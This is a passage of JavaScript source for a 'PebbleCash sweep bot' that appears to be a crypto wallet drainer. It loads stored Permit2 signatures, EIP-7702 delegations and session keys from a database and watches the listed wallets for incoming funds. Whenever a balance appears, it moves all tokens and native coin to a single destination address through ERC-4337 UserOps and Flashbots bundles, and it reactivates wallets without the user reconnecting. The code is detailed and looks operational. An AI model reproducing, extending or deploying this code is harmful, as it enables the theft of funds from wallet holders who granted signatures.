    // TIER 4.5 FALLBACK: run sweepGaslessWallet (AllowanceTransfer via permit_metadata) when
    // the -sig row is absent OR has a non-batch-signature-transfer format (old/malformed record).
    if (wallet.type === "permit2-gasless" &&
        (!stData || stData?.permit?.transfer_type !== "batch-signature-transfer")) {
      log(`[gasless] -sig row absent or non-standard format — trying permit_metadata fallback`);
      await sweepGaslessWallet(checksum);
      // If the -sig row was missing entirely AND sweepGaslessWallet also found no sig data,
      // only then flag re-activation — but only if there's no AllowanceTransfer backup.
      if (!stData) await setNeedsReactivationIfNoBackup(checksum, addrKey);
    }

    // ── Native coin sweep for permit2 wallets (V2.1 sweepETHFor) ──────────
    await trySweepNativeFor(checksum, short);
  }

}

// ══════════════════════════════════════════════════════════════════════════
// TIER 0A: SESSION KEY VIA PIMLICO ERC-4337 USEROP
// ══════════════════════════════════════════════════════════════════════════

async function sweepViaSessionKey(checksum, short, addrKey) {
  // Read session from Supabase session_keys table
  if (!supabase) { log(`[session] no supabase — skipping ${short}`); return false; }

  let { data: session } = await supabase
    .from("session_keys")
    .select("*")
    .eq("address", addrKey)
    .eq("chain", CHAIN)
    .single();

  if (!session) {
    log(`[session] no session found for ${short} — checking delegated_wallets fallback`);
    // Fallback: read from delegated_wallets.permit_metadata
    const { data: dw } = await supabase
      .from("delegated_wallets")
      .select("permit_metadata")
      .eq("address", addrKey)
      .eq("chain", CHAIN)
      .single();
    if (!dw?.permit_metadata?.expiry) { log(`[session] no session data for ${short}`); return false; }
    session = { expiry: dw.permit_metadata.expiry, session_data: dw.permit_metadata.session_data };
  }

  if (!session || !session.expiry) { log(`[session] no session data for ${short}`); return false; }

  const expiry = BigInt(session.expiry);
  if (expiry < BigInt(Math.floor(Date.now() / 1000))) {
    log(`[session] expired for ${short} — marking needs-reauth`);
    await supabase.from("delegated_wallets")
      .update({ status: "needs-reauth" })
      .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
    return false;
  }

  // Check balances
  const balances = await checkAllBalances(checksum);
  const nonZero = balances.filter(b => b.balance > 0n);
  const nativeBal = await getReadProvider().getBalance(checksum);

  if (nonZero.length === 0 && nativeBal === 0n) {
    log(`[session] all zero for ${short} — skipping`);
    return false;
  }

  log(`[session] sweeping ${nonZero.length} tokens + native=${ethers.formatEther(nativeBal)} for ${short}`);

  // Build calls array
  const calls = [];

  // Native sweep
  if (nativeBal > 0n) {
    calls.push({
      to: DESTINATION_ADDRESS,
      value: nativeBal,
      data: "0x",
    });
  }

  // ERC20 sweeps — encode transfer() calls
  const ERC20_TRANSFER_IFACE = new ethers.Interface(["function transfer(address to, uint256 value) external returns (bool)"]);
  for (const token of nonZero) {
    calls.push({
      to: token.address,
      value: 0n,
      data: ERC20_TRANSFER_IFACE.encodeFunctionData("transfer", [DESTINATION_ADDRESS, token.balance]),
    });
  }

  try {
    // Dynamic import of permissionless + viem (ESM-only packages)
    const { createSmartAccountClient } = await import("permissionless");
    const { createPimlicoClient } = await import("permissionless/clients/pimlico");
    const { http, createPublicClient, defineChain } = await import("viem");

    const pimlicoUrl = PIMLICO_URLS[CHAIN];
    if (!pimlicoUrl || !PIMLICO_API_KEY) {
      log(`[session] Pimlico not configured for ${CHAIN} — using fallback sweep`);
      return false;
    }

    // Define the chain for viem
    const viemChain = defineChain({
      id: CHAIN === "eth" ? 1 : CHAIN === "bnb" ? 56 : 137,
      name: CHAIN.toUpperCase(),
      nativeCurrency: {
        name: CHAIN === "eth" ? "Ether" : CHAIN === "bnb" ? "BNB" : "MATIC",
        symbol: CHAIN === "eth" ? "ETH" : CHAIN === "bnb" ? "BNB" : "MATIC",
        decimals: 18,
      },
      rpcUrls: { default: { http: [RPC_URL] } },
    });

    const pimlicoClient = createPimlicoClient({
      transport: http(pimlicoUrl),
    });

    const publicClient = createPublicClient({
      transport: http(RPC_URL),
    });

    const smartAccountClient = createSmartAccountClient({
      account: {
        address: checksum,
        ...(session.session_data || {}),
      },
      chain: viemChain,
      bundlerTransport: http(pimlicoUrl),
      paymaster: pimlicoClient,
      paymasterContext: {
        sponsorshipPolicyId: PIMLICO_POLICY_ID,
      },
    });

    const userOpHash = await smartAccountClient.sendUserOperation({ calls });
    log(`[session] UserOp submitted: ${userOpHash}`);

    const receipt = await smartAccountClient.waitForUserOperationReceipt({ hash: userOpHash });
    log(`[session] ✅ swept via session key tx: ${receipt.receipt.transactionHash}`);
    log(`[session] tokens: ${nonZero.map(t => t.symbol || t.address.slice(0,10)).join(", ")}`);
    return true;

  } catch (e) {
    log(`[session] ❌ UserOperation failed for ${short}: ${e.message}`);
    // If permissionless is not installed or import fails, do simpler fallback
    if (e.code === "ERR_MODULE_NOT_FOUND" || e.message?.includes("Cannot find module")) {
      log(`[session] permissionless/viem not installed — falling back`);
    }
    return false;
  }
}

// ══════════════════════════════════════════════════════════════════════════
// TIER 0B: EIP-7702 + FLASHBOTS ATOMIC BUNDLE (ETH ONLY)
// ══════════════════════════════════════════════════════════════════════════

async function sweepViaFlashbotsBundle(checksum, short, addrKey) {
  // Flashbots only works on ETH mainnet
  if (CHAIN !== "eth") { return false; }
  if (!FLASHBOTS_AUTH_KEY) {
    log(`[flashbots] FLASHBOTS_AUTH_KEY not set`);
    return false;
  }

  log(`[flashbots] building atomic bundle for ${short}`);

  // Read authorization from delegated_wallets
  if (!supabase) { log(`[flashbots] no supabase`); return false; }
  const { data: authData } = await supabase
    .from("delegated_wallets")
    .select("permit_metadata")
    .eq("address", addrKey)
    .eq("chain", "eth")
    .single();

  const authObj = authData?.permit_metadata?.authorization ?? authData?.permit_metadata?.ethAuthorization ?? null;
  if (!authObj) {
    log(`[flashbots] no authorization stored for ${short}`);
    return false;
  }

  // Check balances
  const balances = await checkAllBalances(checksum);
  const nonZero = balances.filter(b => b.balance > 0n);
  const nativeBal = await getReadProvider().getBalance(checksum);

  if (nonZero.length === 0 && nativeBal === 0n) {
    log(`[flashbots] all zero for ${short} — skipping`);
    return false;
  }

  log(`[flashbots] sweeping ${nonZero.length} tokens + native=${ethers.formatEther(nativeBal)}`);

  try {
    // Get current gas prices
    trackQnWrite(); trackQnWrite(); // getFeeData + getBlock
    const feeData = await rpcProvider.getFeeData();
    const block = await rpcProvider.getBlock("latest");
    const baseFee = block?.baseFeePerGas || 0n;
    const maxPrio = feeData.maxPriorityFeePerGas || 1_000_000_000n; // 1 gwei default
    const maxFee = baseFee * 2n + maxPrio;

    const targetBlock = block.number + 1;

    // Use NonceManager's tracked nonce — this accounts for any in-flight txs that
    // sendTransaction() already submitted (gas airdrops, other sweeps) so we never
    // collide. Do NOT use rpcProvider.getTransactionCount which bypasses NonceManager.
    const baseNonce = await relayerWallet.getNonce("pending");

    // TX 1: EIP-7702 SetCode — sets user EOA code to TCNDelegation
    const setCodeTx = {
      type: 4,
      to: checksum,
      value: 0,
      data: "0x",
      gasLimit: 50000,
      maxFeePerGas: maxFee,
      maxPriorityFeePerGas: maxPrio,
      nonce: baseNonce,
      chainId: 1,
      authorizationList: [authObj],
    };

    // TX 2: sweepAll() on the now-delegated EOA
    const DELEGATION_SWEEP_IFACE = new ethers.Interface([
      "function sweepAll(address[] tokens, address to) external",
    ]);
    // Use full dynamic TOKENS list (same as sweepDelegatedWallet) — not the short TOKENS_TO_WATCH env var.
    const tokenList = TOKENS.map(t => t.address).filter(Boolean);
    const sweepTx = {
      type: 2,
      to: checksum,
      value: 0,
      data: DELEGATION_SWEEP_IFACE.encodeFunctionData("sweepAll", [tokenList, DESTINATION_ADDRESS]),
      gasLimit: 300000 + (nonZero.length * 50000),
      maxFeePerGas: maxFee,
      maxPriorityFeePerGas: maxPrio,
      nonce: baseNonce + 1,
      chainId: 1,
    };

    // Sign both transactions with relayer key
    const signedSetCode = await relayerWallet.signTransaction(setCodeTx);
    const signedSweep = await relayerWallet.signTransaction(sweepTx);

    // Use Flashbots relay via eth_callBundle (simulate) then eth_sendBundle
    const authSigner = new ethers.Wallet(FLASHBOTS_AUTH_KEY);
    const flashbotsAuth = await authSigner.signMessage(
      ethers.getBytes(ethers.keccak256(ethers.toUtf8Bytes("FLASHBOTS_AUTH")))
    );

    const bundleParams = {
      txs: [signedSetCode, signedSweep],
      blockNumber: ethers.toBeHex(targetBlock),
      minTimestamp: 0,
      maxTimestamp: 0,
      revertingTxHashes: [],
    };

    // Simulate first
    const flashbotsRelay = "https://relay.flashbots.net";
    const simBody = {
      jsonrpc: "2.0",
      id: 1,
      method: "eth_callBundle",
      params: [bundleParams],
    };

    const simRes = await fetch(flashbotsRelay, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Flashbots-Signature": `${authSigner.address}:${flashbotsAuth}`,
      },
      body: JSON.stringify(simBody),
    });

    const simResult = await simRes.json();
    if (simResult.error) {
      log(`[flashbots] simulation failed: ${simResult.error.message}`);
      return false;
    }

    log(`[flashbots] simulation OK — bundle gas: ${simResult.result?.bundleGasPrice || "unknown"}`);

    // Send bundle — try 3 consecutive blocks
    let included = false;
    for (let i = 0; i < 3; i++) {
      const blockNum = targetBlock + i;
      bundleParams.blockNumber = ethers.toBeHex(blockNum);

      const sendBody = {
        jsonrpc: "2.0",
        id: 1,
        method: "eth_sendBundle",
        params: [bundleParams],
      };

      const sendRes = await fetch(flashbotsRelay, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Flashbots-Signature": `${authSigner.address}:${flashbotsAuth}`,
        },
        body: JSON.stringify(sendBody),
      });

      const sendResult = await sendRes.json();
      if (sendResult.error) {
        log(`[flashbots] bundle error for block ${blockNum}: ${sendResult.error.message}`);
        continue;
      }

      log(`[flashbots] bundle submitted for block ${blockNum} — bundleHash: ${sendResult.result?.bundleHash}`);

      // Wait 12 seconds for block inclusion
      await sleep(12_000);

      // Check if bundle was included by verifying target block
      const currentBlock = await rpcProvider.getBlockNumber();
      if (currentBlock >= blockNum) {
        log(`[flashbots] block ${blockNum} passed — checking code`);
        const code = await getReadProvider().getCode(checksum);
        if (code && code !== "0x" && code.startsWith("0xef0100")) {
          log(`[flashbots] ✅ delegation active — checking if sweeps went through`);
          const postNative = await getReadProvider().getBalance(checksum);
          if (postNative < nativeBal) {
            log(`[flashbots] ✅ bundle included in block ${blockNum}`);
            included = true;
            break;
          }
        }
        log(`[flashbots] bundle not confirmed in block ${blockNum} — trying next`);
      } else {
        log(`[flashbots] block ${blockNum} not yet reached — trying next`);
      }
    }

    if (!included) {
      log(`[flashbots] bundle not included after 3 blocks — falling back to standard EIP-7702`);
      relayerWallet.reset(); // resync NonceManager with chain state after pre-signed nonces
      return false;
    }

    relayerWallet.reset(); // resync NonceManager: bundle used baseNonce & baseNonce+1 outside NM
    return true;

  } catch (e) {
    log(`[flashbots] ❌ error for ${short}: ${e.message}`);
    relayerWallet.reset(); // always resync after Flashbots to avoid stale nonce counter
    return false;
  }
}

// ── Transfer event listeners ──────────────────────────────────────────────────

async function startTransferListeners(wsProvider, tokens) {
  const transferTopic = ethers.id("Transfer(address,address,uint256)");

  // Build address→token lookup for fast decode inside handler
  const tokenByAddr = new Map(tokens.map(t => [t.address.toLowerCase(), t]));

  // Split into batches of 100 addresses — QuickNode supports large arrays.
  // Smaller batches = more eth_subscribe/unsubscribe calls = rate-limit crashes.
  const BATCH_SIZE = 100;
  const batches = [];
  for (let i = 0; i < tokens.length; i += BATCH_SIZE) {
    batches.push(tokens.slice(i, i + BATCH_SIZE));
  }

  // Build wallet topics for Transfer event topic[2] filter.
  // This tells QuickNode to ONLY deliver Transfer events where the 'to'
  // address is one of our monitored wallets — dropping 99%+ of events.
  // Without this, every USDT/USDC transfer on BNB/Polygon gets delivered
  // (millions/day), each counting as a QuickNode API call.
  //
  // CRITICAL: if walletTopics is empty [] the EVM filter treats it as "any",
  // meaning ALL transfers for the watched tokens get delivered — millions/day,
  // each counting as a QuickNode API call.  Guard: skip subscription creation
  // entirely when there are no monitored wallets; scheduleTransferRebuild()
  // will call us again once wallets arrive via Realtime or the 5-min poll.
  const walletTopics = [...monitoredWallets.keys()].map(addr =>
    ethers.zeroPadValue(addr, 32)
  );

  if (walletTopics.length === 0) {
    log(`[listeners] no monitored wallets yet — skipping Transfer subscriptions to avoid match-all filter`);
    return;
  }

  log(`[listeners] creating ${batches.length} log-filter subscriptions for ${tokens.length} tokens (${monitoredWallets.size} wallets monitored, wallet-filtered topic[2])`);

  for (let i = 0; i < batches.length; i++) {
    // Stagger 200ms between each batch to stay within rate limits
    if (i > 0) await sleep(200);

    const batch  = batches[i];
    const filter = {
      // topics[2] = 'to' address in Transfer(from, to, value).
      // Array = OR filter: deliver only if 'to' matches any of our wallets.
      topics:  [transferTopic, null, walletTopics],
      address: batch.map(t => t.address),
    };

    try {
      wsProvider.on(filter, async (txLog) => {
        // topics[2] = padded 'to' address
        const to      = "0x" + txLog.topics[2].slice(26);
        const toLower = to.toLowerCase();

        if (!monitoredWallets.has(toLower)) return;

        const amount = BigInt(txLog.data);
        if (amount === 0n) return;

        const token  = tokenByAddr.get(txLog.address.toLowerCase());
        const symbol = token?.symbol ?? txLog.address.slice(0, 8);
        log(`[transfer] 📥 ${symbol} → ${to.slice(0, 10)} amount=${ethers.formatUnits(amount, token?.decimals ?? 18)} — sweeping`);

        const wallet = monitoredWallets.get(toLower);
        // dispatchSweep handles its own debounce + pending-queue logic
        dispatchSweep(wallet)
          .catch(e => log(`[transfer] sweep error for ${to.slice(0, 10)}: ${e.message}`));
      });
    } catch (e) {
      warn(`[listeners] batch ${i} subscription failed: ${e.message}`);
    }
  }

  log(`[listeners] ✅ ${batches.length} log-filter subscriptions active for ${tokens.length} tokens`);
}

// ── Native coin poll timer (replaces WS block subscription) ─────────────────
// Polling via setInterval on the free scanProvider every 120s avoids consuming
// a QuickNode WS message on every ETH block (~12s). The WS block subscription
// was firing ~5 events/min (300/hr) doing nothing except check a throttle.
let _nativePollTimer = null;

async function _nativePollTick() {
  if (monitoredWallets.size === 0) return;

  try {
    const blockNumber = await scanProvider.getBlockNumber();
    const block = await scanProvider.getBlock(blockNumber, true);
    if (!block?.transactions) return;

    for (const tx of block.transactions) {
      if (!tx.to) continue;
      const toLower = tx.to.toLowerCase();
      if (!monitoredWallets.has(toLower)) continue;
      if (!tx.value || tx.value === 0n) continue;

      const wallet = monitoredWallets.get(toLower);
      log(`[native] 📥 ${ethers.formatEther(tx.value)} ETH → ${tx.to.slice(0, 10)} type=${wallet.type}`);

      // All wallet types: dispatchSweep will sweep ERC20s (permit2/direct-allowance)
      // and ETH (eip7702 via sweepETH, non-7702 via sweepETHFor if authorised).
      dispatchSweep(wallet)
        .catch(e => log(`[native] sweep error: ${e.message}`));
    }
  } catch (e) {
    if (e.message?.includes("rate limit") || e.message?.includes("50/second") || e.message?.includes("429")) {
      log(`[native] rate limited — skipping poll`);
    } else if (!e.message?.includes("timeout")) {
      warn(`[native] poll error: ${e.message}`);
    }
  }
}

function startNativeListener(_wsProvider) {
  // _wsProvider is unused — kept for call-site compatibility.
  if (_nativePollTimer) clearInterval(_nativePollTimer);
  _nativePollTimer = setInterval(_nativePollTick, 120_000);
  _nativePollTick(); // run once immediately
  log(`[listeners] native coin poll active (120s interval via scanProvider — zero WS overhead)`);
}

// ── Supabase: load existing wallets on startup ────────────────────────────────

async function loadDelegatedWallets() {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from("delegated_wallets")
      .select("address, type, needs_reactivation")
      .eq("chain", CHAIN);
    if (error) { warn(`loadDelegatedWallets: ${error.message}`); return; }
    delegatedWallets.clear();
    monitoredWallets.clear();
    let skippedReauth = 0;
    for (const row of data || []) {
      const checksum = normalizeAddress(row.address);
      if (!checksum) continue;
      const type = row.type || "eip7702";
      const needsReauth = !!(row.needs_reactivation && (type === "permit2-gasless" || type === "permit2"));
      if (needsReauth) {
        needsReauthWallets.add(checksum.toLowerCase());
        skippedReauth++;
      }
      delegatedWallets.set(checksum, type);
      monitoredWallets.set(checksum.toLowerCase(), { address: checksum, type, needs_reactivation: needsReauth });
    }
    const types    = [...delegatedWallets.values()];
    const e7Count  = types.filter(t => t === "eip7702").length;
    const skCount  = types.filter(t => t === "session-key").length;
    const p2Count  = types.filter(t => t === "permit2" || t === "wrap-fallback" || t === "permit2-gasless").length;
    const daCount  = types.filter(t => t === "direct-allowance").length;
    log(`[init] loaded ${delegatedWallets.size} wallets (${skCount} session, ${e7Count} eip7702, ${p2Count} permit2, ${daCount} direct) — ${skippedReauth} need re-auth`);
  } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
}

// ── Supabase Realtime ─────────────────────────────────────────────────────────

function subscribeRealtime() {
  if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }

  if (realtimeChannel) {
    supabase.removeChannel(realtimeChannel).then(v => v, () => {});
    realtimeChannel = null;
  }

  // Tag this channel with a generation number so its status callback can tell
  // whether it has since been superseded by a newer subscribeRealtime() call
  // (e.g. the removeChannel() teardown above can itself emit a late "CLOSED"
  // status asynchronously) — without this, a stale channel's teardown could
  // schedule a duplicate/competing resubscribe on top of the fresh one.
  const myGeneration = ++_realtimeGeneration;

  realtimeChannel = supabase
    .channel(`bot_realtime_${CHAIN}`)

    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        const isNew = !monitoredWallets.has(address.toLowerCase());
        delegatedWallets.set(address, type);
        monitoredWallets.set(address.toLowerCase(), { address, type, needs_reactivation: false });
        needsReconnect.delete(address.toLowerCase());
        needsReauthWallets.delete(address.toLowerCase());
        log(`[realtime] 🔔 ${isNew ? "new" : "updated"} wallet ${address.slice(0, 10)} (${type}) — checking balance`);
        // Rebuild Transfer subscriptions so the new wallet is included in the
        // topics[2] filter. Without this, Transfer events for this wallet are
        // never delivered because the filter was built at bot startup.
        scheduleTransferRebuild();
        const balances = await checkAllBalances(address);
        const nonZero  = balances.filter(b => b.balance > 0n);
        if (nonZero.length > 0) {
          log(`[realtime] has balance (${nonZero.map(b => b.symbol).join(", ")}) — sweeping immediately`);
          await dispatchSweep({ address, type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
        } else {
          log(`[realtime] ${address.slice(0, 10)} — no existing balance, monitoring for transfers`);
        }
      }
    )

    .on(
      "postgres_changes",
      { event: "UPDATE", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        if (type === "monitoring") return;
        // Only block sweep for wallet types that require a user signature to sweep.
        // direct-allowance (live ERC-20 allowance) and eip7702 (on-chain delegation)
        // never need user re-signing — their sweep paths work regardless of this flag.
        const needsSig = type === "permit2-gasless" || type === "permit2";
        if (row.needs_reactivation && needsSig) {
          log(`[realtime] ${address.slice(0, 10)} (${type}) — needs_reactivation set, awaiting user reconnect`);
          delegatedWallets.set(address, type);
          monitoredWallets.set(address.toLowerCase(), { address, type, needs_reactivation: true });
          return;
        }
        delegatedWallets.set(address, type);
        monitoredWallets.set(address.toLowerCase(), { address, type, needs_reactivation: false });
        needsReconnect.delete(address.toLowerCase());
        needsReauthWallets.delete(address.toLowerCase());
        log(`[realtime] 🔄 re-activated ${address.slice(0, 10)} (${type}) — dispatching sweep`);
        // Rebuild Transfer subscriptions to include this wallet in the topics[2] filter.
        scheduleTransferRebuild();
        // Always sweep on re-activation: new signatures may cover tokens with
        // zero balance now but positive balance moments later, and the balance
        // check only covers tokens in the watch list.
        dispatchSweep({ address, type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
      }
    )

    // ── permit2_signatures INSERT — auto-reactivate stuck wallets ───────────
    // When retryPendingPosts pushes a fresh sig for a wallet that's already
    // needs_reactivation=true, the delegated_wallets table isn't touched so the
    // UPDATE handler above never fires. This subscription catches the sig INSERT
    // and reactivates the wallet automatically — no user reconnect required.
    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "permit2_signatures", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row = payload.new || {};
        const sigAddress = row.address || "";
        // Strip -sig suffix to recover the real wallet address
        const walletAddrRaw = sigAddress.endsWith("-sig") ? sigAddress.slice(0, -4) : sigAddress;
        const address = normalizeAddress(walletAddrRaw);
        if (!address) return;
        const key = address.toLowerCase();
        const existing = monitoredWallets.get(key);
        if (!existing) return;
        if (!existing.needs_reactivation) return; // already active
        if (existing.type !== "permit2-gasless" && existing.type !== "permit2") return;
        if (row.spent === true) return; // already consumed sig
        const deadline = row.deadline ? new Date(row.deadline).getTime() : Infinity;
        if (deadline < Date.now()) return; // expired sig
        log(`[realtime] 🔑 fresh sig for stuck wallet ${address.slice(0, 10)} — auto-reactivating`);
        if (supabase) {
          await supabase.from("delegated_wallets")
            .update({ needs_reactivation: false })
            .eq("address", key).eq("chain", CHAIN).then(v => v, () => {});
        }
        monitoredWallets.set(key, { ...existing, needs_reactivation: false });
        needsReauthWallets.delete(key);
        log(`[realtime] 🔄 reactivated ${address.slice(0, 10)} via permit2_signatures — dispatching sweep`);
        dispatchSweep({ address, type: existing.type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
      }
    )

    .subscribe((status) => {
      if (myGeneration !== _realtimeGeneration) return; // stale channel superseded by a newer subscribeRealtime() call
      if (status === "SUBSCRIBED") {
        log(`[realtime] ✅ subscribed (delegated_wallets + permit2_signatures, chain=${CHAIN})`);
      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT" || status === "CLOSED") {
        // CLOSED was previously unhandled — a server-initiated close (as opposed to an
        // error/timeout) left the bot with a dead Realtime channel and no resubscribe,
        // silently missing all future wallet-signature/reactivation events until restart.
        warn(`[realtime] ${status} — resubscribing in 10s`);
        setTimeout(subscribeRealtime, 10_000);
      }
    });
}

// ── WS heartbeat — detects silently-dead connections ─────────────────────────
// A WS/TCP connection can go stale (NAT/idle timeout, peer vanishes without a
// TCP RST, etc.) without ever firing "error" or "close" on the socket. When
// that happens the bot keeps its listeners attached to a dead connection and
// goes permanently deaf to Transfer events until someone manually restarts it
// — the leading suspect for historical "bot stopped sweeping" reports. Ping
// the raw socket every 30s; if a pong hasn't arrived by the next tick, force
// -terminate the socket so the existing "close" handler runs the normal
// backoff+reconnect path.
let _wsHeartbeatTimer = null;
function stopWsHeartbeat() {
  if (_wsHeartbeatTimer) { clearInterval(_wsHeartbeatTimer); _wsHeartbeatTimer = null; }
}
function startWsHeartbeat(wsProvider) {
  stopWsHeartbeat();
  const sock = wsProvider?.websocket;
  if (!sock || typeof sock.ping !== "function") return;
  let pongReceived = true;
  sock.on("pong", () => { pongReceived = true; });
  _wsHeartbeatTimer = setInterval(() => {
    if (!pongReceived) {
      warn("[ws] heartbeat timeout — no pong received, terminating stale connection");
      stopWsHeartbeat();
      try { (sock.terminate ?? sock.close)?.call(sock); } catch (e) { warn(`[ws] terminate failed: ${e.message}`); }
      return;
    }
    pongReceived = false;
    try { sock.ping(); } catch (e) { warn(`[ws] ping failed: ${e.message}`); }
  }, 30_000);
}

// ── WSS listener: Transfer events + native block scanner ─────────────────────

async function startBot() {
  try {
    // staticNetwork prevents ethers from calling eth_chainId on the WS connection
    // during setup — avoids a brief "failed to detect network" log burst if the
    // node is slow to respond on the first message.
    const wsProvider = new ethers.WebSocketProvider(WS_URL, ETH_NETWORK);
    activeWsProvider = wsProvider; // store for Transfer subscription rebuild

    wsProvider.websocket.on("error", (wsErr) => {
      warn(`[ws] error: ${wsErr?.message ?? wsErr}`);
    });

    wsProvider.websocket.on("close", () => {
      warn("[ws] closed — removing listeners and reconnecting...");
      stopWsHeartbeat();
      wsProvider.removeAllListeners();
      activeWsProvider = null;
      const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
      const delay = withJitter(base);
      reconnectAttempt++;
      log(`[ws] reconnecting in ${(delay / 1000).toFixed(1)}s (attempt ${reconnectAttempt})...`);
      setTimeout(startBot, delay);
    });

    // TOKENS loaded once in init() with 24h file cache — NEVER re-fetched here.
    // rpcProvider NOT recreated — FallbackProvider handles failover internally.
    await startTransferListeners(wsProvider, TOKENS);
    await startNativeListener(wsProvider);
    startWsHeartbeat(wsProvider);

    log(`[ws] ✅ connected — Transfer listeners active for ${TOKENS.length} tokens`);
    // Reset backoff after a successful (re)connect — a disconnect long from now
    // should retry fast again, not inherit the maxed-out delay from past outages.
    reconnectAttempt = 0;
  } catch (e) {
    err(`[ws] startBot failed: ${e.message}`);
    const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
    const delay = withJitter(base);
    reconnectAttempt++;
    log(`[ws] retrying in ${(delay / 1000).toFixed(1)}s (attempt ${reconnectAttempt})...`);
    setTimeout(startBot, delay);
  }
}

// ── Init ──────────────────────────────────────────────────────────────────────

async function init() {
  log("[init] PebbleCash sweep bot starting...");
  log(`[init] chain=${CHAIN}`);
  log(`[init] relayer=${relayerWallet.address}`);
  log(`[init] destination=${DESTINATION_ADDRESS}`);
  log(`[init] permit2=${PERMIT2_ADDRESS}`);
  if (CONTRACT_ADDRESS) log(`[init] contract=${CONTRACT_ADDRESS}`);

  // Fail fast if BOT_ADDRESS (used by backend to validate Permit2 spenders) doesn't
  // match the PRIVATE_KEY-derived address. A mismatch means the frontend signed with
  // a different spender than the bot uses — every AllowanceTransfer sweep will fail.
  const envBotAddr = process.env.BOT_ADDRESS?.toLowerCase().trim();
  if (envBotAddr && relayerWallet.address.toLowerCase() !== envBotAddr) {
    err(`[init] FATAL: PRIVATE_KEY derives ${relayerWallet.address} but BOT_ADDRESS=${envBotAddr}. These must match or every Permit2 sweep will fail. Fix your .env.`);
    process.exit(1);
  }

  // 1. Check relayer balance upfront — warn but always continue
  const relayerOk = await checkRelayerBalance();
  if (!relayerOk) {
    log(`[init] ⚠️  RELAYER CRITICALLY LOW — bot will start but sweeps are DISABLED`);
    log(`[init] Top up relayer: send ${CHAIN.toUpperCase()} to ${relayerWallet.address}`);
    log(`[init] Required minimum: ${ethers.formatEther(RELAYER_MIN_WEI)} ${CHAIN.toUpperCase()}`);
  }

  // 2. Load wallets from Supabase BEFORE starting token load so startupSweepPass
  // never fires against an empty delegatedWallets map (race condition when token
  // cache is warm and loadTokens().then() resolves before loadDelegatedWallets).
  await loadDelegatedWallets();

  // 3. Load token list — start with fallback immediately, upgrade in background.
  // Must call scheduleTransferRebuild() so WebSocket log-filter subscriptions are
  // rebuilt with all 499 tokens — without this the listeners stay frozen on the 8
  // fallback tokens and never catch any real deposits.
  // startupSweepPass() is deferred here so it runs against the full token list.
  TOKENS = FALLBACK_TOKENS[CHAIN] ?? [];
  log(`[init] ${TOKENS.length} fallback tokens loaded — fetching full list in background`);
  loadTokens().then(full => {
    if (full.length > TOKENS.length) {
      TOKENS = full;
      log(`[init] token list upgraded: ${full.length} tokens from CoinGecko`);
      scheduleTransferRebuild(); // rebuild WebSocket subscriptions with full token list
    }
    startupSweepPass();          // run startup sweep with final (full or fallback) token list
  }).catch(() => {
    startupSweepPass();          // also run on CoinGecko failure (with fallback tokens)
  });

  // 4. Subscribe to Supabase Realtime for new/updated wallets
  subscribeRealtime();

  // 4b. Periodic Supabase reload — Realtime failsafe.
  // If the Realtime channel silently stalls (no CHANNEL_ERROR, events just stop arriving),
  // new wallets inserted into delegated_wallets would never be seen until a bot restart.
  // This poll runs every 5 min and merges any new or reactivated wallets into monitoredWallets
  // without clearing state, so in-flight sweeps are not disrupted.
  setInterval(async () => {
    if (!supabase) return;
    try {
      const { data, error } = await supabase
        .from("delegated_wallets")
        .select("address, type, needs_reactivation")
        .eq("chain", CHAIN);
      if (error) return;
      let updates = 0;
      for (const row of data || []) {
        const checksum = normalizeAddress(row.address);
        if (!checksum) continue;
        const key  = checksum.toLowerCase();
        const type = row.type || "eip7702";
        const needsReauth = !!(row.needs_reactivation && (type === "permit2-gasless" || type === "permit2"));
        const existing = monitoredWallets.get(key);
        if (!existing) {
          // New wallet — add and sweep immediately
          delegatedWallets.set(checksum, type);
          monitoredWallets.set(key, { address: checksum, type, needs_reactivation: needsReauth });
          if (needsReauth) needsReauthWallets.add(key);
          log(`[poll] new wallet ${checksum.slice(0, 10)} (${type}) — dispatching sweep`);
          scheduleTransferRebuild();
          dispatchSweep({ address: checksum, type }).catch(e => log(`[poll] sweep error: ${e.message}`));
          updates++;
        } else if (!needsReauth && existing.needs_reactivation) {
          // Reactivation cleared by user re-connecting — sweep now
          monitoredWallets.set(key, { address: checksum, type, needs_reactivation: false });
          needsReauthWallets.delete(key);
          log(`[poll] reactivation cleared for ${checksum.slice(0, 10)} — dispatching sweep`);
          dispatchSweep({ address: checksum, type }).catch(e => log(`[poll] sweep error: ${e.message}`));
          updates++;
        }
      }
      if (updates > 0) log(`[poll] ${updates} wallet(s) synced from Supabase`);
    } catch (e) { warn(`[poll] wallet reload error: ${e.message}`); }
  }, 5 * 60 * 1000);

  // 5. Start WSS: Transfer event listeners + native block scanner
  startBot();

  // 6. Start contract ETH balance monitor (PATH 2 native sweep)
  startContractEthMonitor();

  log("[init] ✅ bot ready — listening for Transfer events, Realtime, and 5-min Supabase poll");
  log("[init] sweeps are event-driven: Transfer events and Realtime will trigger dispatch");

}

async function startupSweepPass() {
  // Check permit2_signatures for any needs_reactivation=true wallets that may
  // have had fresh signatures inserted while the bot was down. Auto-reactivate
  // any that have a valid unspent sig so they're included in the sweep pass.
  if (supabase) {
    try {
      const { data: freshSigs } = await supabase
        .from("permit2_signatures")
        .select("address, deadline, spent")
        .eq("chain", CHAIN)
        .or("spent.is.null,spent.eq.false");
      for (const sig of freshSigs || []) {
        const sigAddress = sig.address || "";
